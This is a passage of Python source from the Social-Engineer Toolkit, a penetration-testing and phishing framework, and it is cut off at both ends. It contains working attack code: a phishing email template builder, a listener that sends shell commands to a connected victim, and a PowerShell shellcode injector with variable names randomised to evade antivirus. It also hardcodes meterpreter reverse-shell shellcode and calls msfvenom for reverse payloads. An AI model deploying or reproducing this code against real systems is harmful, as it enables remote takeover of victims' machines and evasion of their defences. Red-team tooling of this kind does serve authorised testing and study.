         ::::::::::::88::88::88:::88::::::::::::
          `::::::::::88::88::88:::88::::::::::'
            `::::::::88::88::P::::88::::::::'
              `::::::88::88:::::::88::::::'
                 ``:::::::::::::::::::''
                      ``:::::::::''""" + bcolors.ENDC)

    if menu == 14:
        print(bcolors.BOLD + """
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XX                                                                          XX
XX   MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMMMMMMssssssssssssssssssssssssssMMMMMMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMss'''                          '''ssMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMyy''                                    ''yyMMMMMMMMMMMM   XX
XX   MMMMMMMMyy''                                            ''yyMMMMMMMM   XX
XX   MMMMMy''                                                    ''yMMMMM   XX
XX   MMMy'                                                          'yMMM   XX
XX   Mh'                                                              'hM   XX
XX   -                                                                  -   XX
XX                                                                          XX
XX   ::                                                                ::   XX
XX   MMhh.        ..hhhhhh..                      ..hhhhhh..        .hhMM   XX
XX   MMMMMh   ..hhMMMMMMMMMMhh.                .hhMMMMMMMMMMhh..   hMMMMM   XX
XX   ---MMM .hMMMMdd:::dMMMMMMMhh..        ..hhMMMMMMMd:::ddMMMMh. MMM---   XX
XX   MMMMMM MMmm''      'mmMMMMMMMMyy.  .yyMMMMMMMMmm'      ''mmMM MMMMMM   XX
XX   ---mMM ''             'mmMMMMMMMM  MMMMMMMMmm'             '' MMm---   XX
XX   yyyym'    .              'mMMMMm'  'mMMMMm'              .    'myyyy   XX
XX   mm''    .y'     ..yyyyy..  ''''      ''''  ..yyyyy..     'y.    ''mm   XX
XX           MN    .sMMMMMMMMMss.   .    .   .ssMMMMMMMMMs.    NM           XX
XX           N`    MMMMMMMMMMMMMN   M    M   NMMMMMMMMMMMMM    `N           XX
XX            +  .sMNNNNNMMMMMN+   `N    N`   +NMMMMMNNNNNMs.  +            XX
XX              o+++     ++++Mo    M      M    oM++++     +++o              XX
XX                                oo      oo                                XX
XX           oM                 oo          oo                 Mo           XX
XX         oMMo                M              M                oMMo         XX
XX       +MMMM                 s              s                 MMMM+       XX
XX      +MMMMM+            +++NNNN+        +NNNN+++            +MMMMM+      XX
XX     +MMMMMMM+       ++NNMMMMMMMMN+    +NMMMMMMMMNN++       +MMMMMMM+     XX
XX     MMMMMMMMMNN+++NNMMMMMMMMMMMMMMNNNNMMMMMMMMMMMMMMNN+++NNMMMMMMMMM     XX
XX     yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy     XX
XX   m  yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy  m   XX
XX   MMm yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy mMM   XX
XX   MMMm .yyMMMMMMMMMMMMMMMM     MMMMMMMMMM     MMMMMMMMMMMMMMMMyy. mMMM   XX
XX   MMMMd   ''''hhhhh       odddo          obbbo        hhhh''''   dMMMM   XX
XX   MMMMMd             'hMMMMMMMMMMddddddMMMMMMMMMMh'             dMMMMM   XX
XX   MMMMMMd              'hMMMMMMMMMMMMMMMMMMMMMMh'              dMMMMMM   XX
XX   MMMMMMM-               ''ddMMMMMMMMMMMMMMdd''               -MMMMMMM   XX
XX   MMMMMMMM                   '::dddddddd::'                   MMMMMMMM   XX
XX   MMMMMMMM-                                                  -MMMMMMMM   XX
XX   MMMMMMMMM                                                  MMMMMMMMM   XX
XX   MMMMMMMMMy                                                yMMMMMMMMM   XX
XX   MMMMMMMMMMy.                                            .yMMMMMMMMMM   XX
XX   MMMMMMMMMMMMy.                                        .yMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMy.                                    .yMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMs.                                .sMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMMMss.           ....           .ssMMMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMMMMMNo         oNNNNo         oNMMMMMMMMMMMMMMMMMMMM   XX
XX                                                                          XX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
    .o88o.                               o8o                .
    888 `"                               `"'              .o8
   o888oo   .oooo.o  .ooooo.   .ooooo.  oooo   .ooooo.  .o888oo oooo    ooo
    888    d88(  "8 d88' `88b d88' `"Y8 `888  d88' `88b   888    `88.  .8'
    888    `"Y88b.  888   888 888        888  888ooo888   888     `88..8'
    888    o.  )88b 888   888 888   .o8  888  888    .o   888 .    `888'
   o888o   8""888P' `Y8bod8P' `Y8bod8P' o888o `Y8bod8P'   "888"      d8'
                                                                .o...P'
                                                                `XER0'
""" + bcolors.ENDC)

#
# identify if set interactive shells are disabled
#


def set_check():
    fileopen = open("/etc/setoolkit/set.config", "r")
    for line in fileopen:
        match = re.search("SET_INTERACTIVE_SHELL=OFF", line)
        # if we turned it off then we return a true else return false
        if match:
            return True
        match1 = re.search("SET_INTERACTIVE_SHELL=ON", line)
        # return false otherwise
        if match1:
            return False

# if the user specifies 99


def menu_back():
    print_info("Returning to the previous menu...")

# used to generate random templates for the phishing schema


def custom_template():
    try:
        print ("         [****]  Custom Template Generator [****]\n")
        print (
            "Always looking for new templates! In the set/src/templates directory send an email\nto info@trustedsec.com if you got a good template!")
        author = raw_input(setprompt("0", "Enter the name of the author"))
        filename = randomgen = random.randrange(1, 99999999999999999999)
        filename = str(filename) + (".template")
        subject = raw_input(setprompt("0", "Enter the subject of the email"))
        try:
            body = raw_input(setprompt(
                "0", "Enter the body of the message, hit return for a new line. Control+c when finished: "))
            while body != 'sdfsdfihdsfsodhdsofh':
                try:
                    body += (r"\n")
                    body += raw_input("Next line of the body: ")
                except KeyboardInterrupt:
                    break
        except KeyboardInterrupt:
            pass
        filewrite = open("src/templates/%s" % (filename), "w")
        filewrite.write("# Author: " + author + "\n#\n#\n#\n")
        filewrite.write('SUBJECT=' + '"' + subject + '"\n\n')
        filewrite.write('BODY=' + '"' + body + '"\n')
        print("\n")
        filewrite.close()
    except Exception as e:
        print_error("ERROR:An error occured:")
        print(bcolors.RED + "ERROR:" + str(e) + bcolors.ENDC)


# routine for checking length of a payload: variable equals max choice
def check_length(choice, max):
    # start initital loop
    counter = 0
    while 1:
        if counter == 1:
            choice = raw_input(bcolors.YELLOW + bcolors.BOLD +
                               "[!] " + bcolors.ENDC + "Invalid choice try again: ")
        # try block in case its not a integer
        try:
            # check to see if its an integer
            choice = int(choice)
            # okay its an integer lets do the compare
            if choice > max:
                # trigger an exception as not an int
                choice = "blah"
                choice = int(choice)
            # if everythings good return the right choice
            return choice
        # oops, not a integer
        except Exception:
            counter = 1

# valid if IP address is legit


def is_valid_ip(ip):
    return is_valid_ipv4(ip) or is_valid_ipv6(ip)

# ipv4


def is_valid_ipv4(ip):
    pattern = re.compile(r"""
        ^
        (?:
          # Dotted variants:
          (?:
            # Decimal 1-255 (no leading 0's)
            [3-9]\d?|2(?:5[0-5]|[0-4]?\d)?|1\d{0,2}
          |
            0x0*[0-9a-f]{1,2}  # Hexadecimal 0x0 - 0xFF (possible leading 0's)
          |
            0+[1-3]?[0-7]{0,2} # Octal 0 - 0377 (possible leading 0's)
          )
          (?:                  # Repeat 0-3 times, separated by a dot
            \.
            (?:
              [3-9]\d?|2(?:5[0-5]|[0-4]?\d)?|1\d{0,2}
            |
              0x0*[0-9a-f]{1,2}
            |
              0+[1-3]?[0-7]{0,2}
            )
          ){0,3}
        |
          0x0*[0-9a-f]{1,8}    # Hexadecimal notation, 0x0 - 0xffffffff
        |
          0+[0-3]?[0-7]{0,10}  # Octal notation, 0 - 037777777777
        |
          # Decimal notation, 1-4294967295:
          429496729[0-5]|42949672[0-8]\d|4294967[01]\d\d|429496[0-6]\d{3}|
          42949[0-5]\d{4}|4294[0-8]\d{5}|429[0-3]\d{6}|42[0-8]\d{7}|
          4[01]\d{8}|[1-3]\d{0,9}|[4-9]\d{0,8}
        )
        $
    """, re.VERBOSE | re.IGNORECASE)
    return pattern.match(ip) is not None

# ipv6


def is_valid_ipv6(ip):
    """Validates IPv6 addresses.
    """
    pattern = re.compile(r"""
        ^
        \s*                         # Leading whitespace
        (?!.*::.*::)                # Only a single whildcard allowed
        (?:(?!:)|:(?=:))            # Colon iff it would be part of a wildcard
        (?:                         # Repeat 6 times:
            [0-9a-f]{0,4}           # A group of at most four hexadecimal digits
            (?:(?<=::)|(?<!::):)    # Colon unless preceeded by wildcard
        ){6}                        #
        (?:                         # Either
            [0-9a-f]{0,4}           # Another group
            (?:(?<=::)|(?<!::):)    # Colon unless preceeded by wildcard
            [0-9a-f]{0,4}           # Last group
            (?: (?<=::)             # Colon iff preceeded by exacly one colon
             |  (?<!:)              #
             |  (?<=:) (?<!::) :    #
             )                      # OR
         |                          # A v4 address with NO leading zeros
            (?:25[0-4]|2[0-4]\d|1\d\d|[1-9]?\d)
            (?: \.
                (?:25[0-4]|2[0-4]\d|1\d\d|[1-9]?\d)
            ){3}
        )
        \s*                         # Trailing whitespace
        $
    """, re.VERBOSE | re.IGNORECASE | re.DOTALL)
    return pattern.match(ip) is not None


# kill certain processes
def kill_proc(port, flag):
    proc = subprocess.Popen("netstat -antp | grep '%s'" %
                            (port), shell=True, stdout=subprocess.PIPE)
    stdout_value = proc.communicate()[0]
    a = re.search("\d+/%s" % (flag), stdout_value)
    if a:
        b = a.group()
        b = b.replace("/%s" % (flag), "")
        subprocess.Popen("kill -9 %s" % (b), stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE, shell=True).wait()


# check the config file and return value
def check_config(param):
    fileopen = open("/etc/setoolkit/set.config", "r")
    for line in fileopen:
        line = line.rstrip()
        # print line
        # if the line starts with the param we want then we are set, otherwise
        # if it starts with a # then ignore
        if line.startswith(param) != "#":
            if line.startswith(param):
                line = line.rstrip()
                # remove any quotes or single quotes
                line = line.replace('"', "")
                line = line.replace("'", "")
                line = line.split("=", 1)
                return line[1]

# copy an entire folder function


def copyfolder(sourcePath, destPath):
    for root, dirs, files in os.walk(sourcePath):

        # figure out where we're going
        dest = destPath + root.replace(sourcePath, '')

        # if we're in a directory that doesn't exist in the destination folder
        # then create a new folder
        if not os.path.isdir(dest):
            os.mkdir(dest)

        # loop through all files in the directory
        for f in files:

            # compute current (old) & new file locations
            oldLoc = root + '/' + f
            newLoc = dest + '/' + f

            if not os.path.isfile(newLoc):
                try:
                    shutil.copy2(oldLoc, newLoc)
                except IOError:
                    pass


# this routine will be used to check config options within the set.options
def check_options(option):
        # open the directory
    trigger = 0
    if os.path.isfile(userconfigpath + "set.options"):
        fileopen = open(userconfigpath + "set.options", "r").readlines()
        for line in fileopen:
            match = re.search(option, line)
            if match:
                line = line.rstrip()
                line = line.replace('"', "")
                line = line.split("=")
                return line[1]
                trigger = 1

    if trigger == 0:
        return trigger

# future home to update one localized set configuration file


def update_options(option):
        # if the file isn't there write a blank file
    if not os.path.isfile(userconfigpath + "set.options"):
        filewrite = open(userconfigpath + "set.options", "w")
        filewrite.write("")
        filewrite.close()

    # remove old options
    fileopen = open(userconfigpath + "set.options", "r")
    old_options = ""
    for line in fileopen:
        match = re.search(option, line)
        if match:
            line = ""
        old_options = old_options + line
    # append to file
    filewrite = open(userconfigpath + "set.options", "w")
    filewrite.write(old_options + "\n" + option + "\n")
    filewrite.close()

# python socket listener


def socket_listener(port):
    port = int(port)          # needed integer for port
    host = ''                 # Symbolic name meaning the local host
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # set is so that when we cancel out we can reuse port
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((host, port))
    print("Listening on 0.0.0.0:%s" % str(port))
    # listen for only 1000 connection
    s.listen(1000)
    conn, addr = s.accept()
    print('Connected by', addr)
    data = conn.recv(1024)
    # start loop

    while 1:
        command = raw_input("Enter shell command or quit: ")
        conn.send(command)
        # if we specify quit then break out of loop and close socket
        if command == "quit":
            break
        data = conn.recv(1024)
        print(data)
    conn.close()

# generates powershell payload


def generate_powershell_alphanumeric_payload(payload, ipaddr, port, payload2):
    # generate our shellcode first
    shellcode = metasploit_shellcode(payload, ipaddr, port)
    try:

        # if not "reverse_http" in payload or not "reverse_https" in payload:
        if not "http" in payload:
            shellcode = shellcode_replace(ipaddr, port, shellcode).rstrip()
        # sub in \x for 0x
        shellcode = re.sub("\\\\x", "0x", shellcode)
        shellcode = shellcode.replace("\\", "")
        # base counter
        counter = 0
        # count every four characters then trigger floater and write out data
        floater = ""
        # ultimate string
        newdata = ""
        for line in shellcode:
            floater = floater + line
            counter = counter + 1
            if counter == 4:
                newdata = newdata + floater + ","
                floater = ""
                counter = 0

        # heres our shellcode prepped and ready to go
        shellcode = newdata[:-1]

    except Exception as e:
        print_error("Something went wrong, printing error: " + str(e))

    # added random vars before and after to change strings - AV you are
    # seriously ridiculous.
    var1 = "$" + generate_random_string(2, 2) # $1 
    var2 = "$" + generate_random_string(2, 2) # $c
    var3 = "$" + generate_random_string(2, 2) # $2
    var4 = "$" + generate_random_string(2, 2) # $3
    var5 = "$" + generate_random_string(2, 2) # $x
    var6 = "$" + generate_random_string(2, 2) # $t
    var7 = "$" + generate_random_string(2, 2) # $h
    var8 = "$" + generate_random_string(2, 2) # $z
    var9 = "$" + generate_random_string(2, 2) # $g
    var10 = "$" + generate_random_string(2, 2) # $i
    var11 = "$" + generate_random_string(2, 2) # $w

    # one line shellcode injection with native x86 shellcode
    powershell_code = (r"""$1 = '$t = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $t -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;){Start-Sleep 60};';$h = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-ec ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2 $h"}else{;iex "& powershell $2 $h";}""" % (shellcode))

    # run it through a lame var replace
    powershell_code = powershell_code.replace("$1", var1).replace("$c", var2).replace(
        "$2", var3).replace("$3", var4).replace("$x", var5).replace("$t", var6).replace(
        "$h", var7).replace("$z", var8).replace("$g", var9).replace("$i", var10).replace(
        "$w", var11)

    # unicode and base64 encode and return it
    return base64.b64encode(powershell_code.encode('utf_16_le')).decode("ascii")

# generate base shellcode
def generate_shellcode(payload, ipaddr, port):
    msf_path = meta_path()
    # generate payload
    port = port.replace("LPORT=", "")
    proc = subprocess.Popen("%smsfvenom -p %s LHOST=%s LPORT=%s StagerURILength=5 StagerVerifySSLCert=false -a x86 --platform windows --smallest -f c" % (msf_path, payload, ipaddr, port), stdout=subprocess.PIPE, shell=True)
    data = proc.communicate()[0]
    data = data.decode('ascii')
    # start to format this a bit to get it ready
    repls = [';', ' ', '+', '"', '\n', 'unsigned char buf=',
             'unsignedcharbuf[]=', "b'", "'", '\\n']
    for repl in repls:
        data = data.replace(repl, "")
    return data

# this will take input for shellcode and do a replace for IP addresses
def shellcode_replace(ipaddr, port, shellcode):
    # split up the ip address
    ip = ipaddr.split('.')
    # join the ipaddress into hex value spaces still in tact
    ipaddr = ' '.join((hex(int(i))[2:] for i in ip))

    # We use a default 255.254.253.252 on all shellcode then replace
    # 255.254.253.252 --> hex --> ff fe fd fc
    # 443 = '0x1bb'
    if port != "443":
        port = hex(int(port))
        # hack job in order to get ports into right format
        # if we are only using three numbers then you have to flux in a zero
        if len(port) == 5:
            port = port.replace("0x", "\\x0")
        else:
            port = port.replace("0x", "\\x")
        # here we break the counters down a bit to get the port into the right
        # format
        counter = 0
        new_port = ""
        for a in port:
            if counter < 4:
                new_port += a
            if counter == 4:
                new_port += "\\x" + a
                counter = 0
            counter = counter + 1
        # redefine the port in hex here
        port = new_port

    ipaddr = ipaddr.split(" ")
    first = ipaddr[0]
    # split these up to make sure its in the right format
    if len(first) == 1:
        first = "0" + first
    second = ipaddr[1]
    if len(second) == 1:
        second = "0" + second
    third = ipaddr[2]
    if len(third) == 1:
        third = "0" + third
    fourth = ipaddr[3]
    if len(fourth) == 1:
        fourth = "0" + fourth

    # put the ipaddress into the right format
    ipaddr = "\\x%s\\x%s\\x%s\\x%s" % (first, second, third, fourth)
    shellcode = shellcode.replace(r"\xff\xfe\xfd\xfc", ipaddr)

    if port != "443":
        # getting everything into the right format
        if len(port) > 4:
            port = "\\x00" + port
        # if we are using a low number like 21, 23, etc.
        if len(port) == 4:
            port = "\\x00\\x00" + port
        shellcode = shellcode.replace(r"\x00\x01\xbb", port)

    # return shellcode
    return shellcode

# exit routine


def exit_set():
    cleanup_routine()
    print("\n\n Thank you for " + bcolors.RED + "shopping" + bcolors.ENDC +
          " with the Social-Engineer Toolkit.\n\n Hack the Gibson...and remember...hugs are worth more than handshakes.\n")
    sys.exit()


# these are payloads that are callable
def metasploit_shellcode(payload, ipaddr, port):
    # if we are using reverse meterpreter tcp
    if payload == "windows/meterpreter/reverse_tcp":
        shellcode = r"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xff\xfe\xfd\xfc\x68\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x85\xf6\x75\xec\xc3"

    # reverse https requires generation through msfvenom
    if payload == "windows/meterpreter/reverse_https":
        print_status(
            "Reverse_HTTPS takes a few seconds to calculate..One moment..")
        shellcode = generate_shellcode(payload, ipaddr, port)

    # reverse http requires generation through msfvenom
    if payload == "windows/meterpreter/reverse_http":
        print_status(
            "Reverse_HTTP takes a few seconds to calculate..One moment..")
        shellcode = generate_shellcode(payload, ipaddr, port)

    # allports requires generation through msfvenom
    if payload == "windows/meterpreter/reverse_tcp_allports":
        print_status(
            "Reverse TCP Allports takes a few seconds to calculate..One moment..")
        shellcode = generate_shellcode(payload, ipaddr, port)

    # reverse tcp needs to be rewritten for shellcode, will do later
    if payload == "windows/shell/reverse_tcp":
        print_status(
            "Reverse Shell takes a few seconds to calculate..One moment..")
        shellcode = generate_shellcode(payload, ipaddr, port)

    # reverse meterpreter tcp
    if payload == "windows/x64/meterpreter/reverse_tcp":
        shellcode = r"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\xff\xfe\xfd\xfc\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x48\x83\xc4\x20\x5e\x6a\x40\x41\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xe1\x41\xff\xe7"

    return shellcode

# here we encrypt via aes, will return encrypted string based on secret
# key which is random


def encryptAES(secret, data):

    # the character used for padding--with a block cipher such as AES, the value
    # you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
    # used to ensure that your value is always a multiple of BLOCK_SIZE
    PADDING = '{'

    BLOCK_SIZE = 32

    # one-liner to sufficiently pad the text to be encrypted
    pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING

    # random value here to randomize builds
    a = 50 * 5

    # one-liners to encrypt/encode and decrypt/decode a string
    # encrypt with AES, encode with base64
    EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
    DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

    cipher = AES.new(secret)

    aes = EncodeAES(cipher, data)
    return str(aes)

# compare ports to make sure its not already in a config file for metasploit


def check_ports(filename, port):
    fileopen = open(filename, "r")
    data = fileopen.read()
    match = re.search("LPORT " + port, data)
    if match:
        return True
    else:
        return False

# the main ~./set path for SET


def setdir():
    if check_os() == "posix":
        return os.path.join(os.path.expanduser('~'), '.set' + '/')
    if check_os() == "windows":
        return "src/program_junk/"

# set the main directory for SET
userconfigpath = setdir()

# Copyright (c) 2007 Brandon Sterne
# Licensed under the MIT license.
# http://brandon.sternefamily.net/files/mit-license.txt
# CIDR Block Converter - 2007

# convert an IP address from its dotted-quad format to its
# 32 binary digit representation


def ip2bin(ip):
    b = ""
    inQuads = ip.split(".")
    outQuads = 4
    for q in inQuads:
        if q != "":
            b += dec2bin(int(q), 8)
            outQuads -= 1
    while outQuads > 0:
        b += "00000000"
        outQuads -= 1
    return b

# convert a decimal number to binary representation
# if d is specified, left-pad the binary number with 0s to that length


def dec2bin(n, d=None):
    s = ""
    while n > 0:
        if n & 1:
            s = "1" + s
        else:
            s = "0" + s
        n >>= 1
    if d is not None:
        while len(s) < d:
            s = "0" + s
    if s == "":
        s = "0"
    return s

# convert a binary string into an IP address


def bin2ip(b):
    ip = ""
    for i in range(0, len(b), 8):
        ip += str(int(b[i:i + 8], 2)) + "."
    return ip[:-1]

# print a list of IP addresses based on the CIDR block specified


def printCIDR(c):
    parts = c.split("/")
    baseIP = ip2bin(parts[0])
    subnet = int(parts[1])
    # Python string-slicing weirdness:
    # if a subnet of 32 was specified simply print the single IP
    if subnet == 32:
        ipaddr = bin2ip(baseIP)
    # for any other size subnet, print a list of IP addresses by concatenating
    # the prefix with each of the suffixes in the subnet
    else:
        ipPrefix = baseIP[:-(32 - subnet)]
        breakdown = ''
        for i in range(2**(32 - subnet)):
            ipaddr = bin2ip(ipPrefix + dec2bin(i, (32 - subnet)))
            ip_check = is_valid_ip(ipaddr)
            if ip_check != False:
                    # return str(ipaddr)
                breakdown = breakdown + str(ipaddr) + ","
        return breakdown

# input validation routine for the CIDR block specified


def validateCIDRBlock(b):
    # appropriate format for CIDR block ($prefix/$subnet)
    p = re.compile("^([0-9]{1,3}\.){0,3}[0-9]{1,3}(/[0-9]{1,2}){1}$")
    if not p.match(b):
        return False
    # extract prefix and subnet size
    prefix, subnet = b.split("/")
    # each quad has an appropriate value (1-255)
    quads = prefix.split(".")
    for q in quads:
        if (int(q) < 0) or (int(q) > 255):
            # print "Error: quad "+str(q)+" wrong size."
            return False
    # subnet is an appropriate value (1-32)
    if (int(subnet) < 1) or (int(subnet) > 32):
        print("Error: subnet " + str(subnet) + " wrong size.")
        return False
    # passed all checks -> return True
    return True

# Queries a remote host on UDP:1434 and returns MSSQL running port
# Written by Larry Spohn (spoonman) @ TrustedSec


def get_sql_port(host):

    # Build the socket with a .1 second timeout
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(.2)

    # Attempt to query UDP:1434 and return MSSQL running port
    try:
        sql_port = None
        try:
            port = 1434
            msg = "\x02\x41\x41\x41\x41"
            s.sendto(msg, (host, port))
            d = s.recvfrom(1024)
            sql_port = d[0].split(";")[9]

        # if we have an exception, udp 1434 isnt there could be firewalled off
        # so we need to check 1433 just in case
        except:
            sql_port = "1433"
            pass

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(.2)
            s.connect((host, int(sql_port)))
            return_host = host + ":" + sql_port
            if return_host != ":" + sql_port:
                return host + ":" + sql_port

        # if port is closed
        except:
            return None

    except Exception as err:
        print(err)
        pass

# capture output from a function


def capture(func, *args, **kwargs):
    """Capture the output of func when called with the given arguments.
    The function output includes any exception raised. capture returns
    a tuple of (function result, standard output, standard error).
    """
    stdout, stderr = sys.stdout, sys.stderr
    sys.stdout = c1 = io.StringIO()
    sys.stderr = c2 = io.StringIO()
    result = None
    try:
        result = func(*args, **kwargs)
    except:
        traceback.print_exc()
    sys.stdout = stdout
    sys.stderr = stderr
    return (result, c1.getvalue(), c2.getvalue())

# check to see if we are running backbox linux


def check_backbox():
    if os.path.isfile("/etc/issue"):
        backbox = open("/etc/issue", "r")
        backboxdata = backbox.read()
        if "BackBox" in backboxdata:
            return "BackBox"
        # if we aren't running backbox
        else:
            return "Non-BackBox"
    else:
        print("[!] Not running a Debian variant..")
        return "Non-BackBox"

# check to see if we are running kali linux


def check_kali():
    if os.path.isfile("/etc/apt/sources.list"):
        kali = open("/etc/apt/sources.list", "r")
        kalidata = kali.read()
        if "kali" in kalidata:
            return "Kali"
        # if we aren't running kali
        else:
            return "Non-Kali"
    else:
        print("[!] Not running a Debian variant..")
        return "Non-Kali"

# here we give multiple options to specify for SET java applet


def applet_choice():

    # prompt here
    print("""
[-------------------------------------------]
Java Applet Configuration Options Below
[-------------------------------------------]
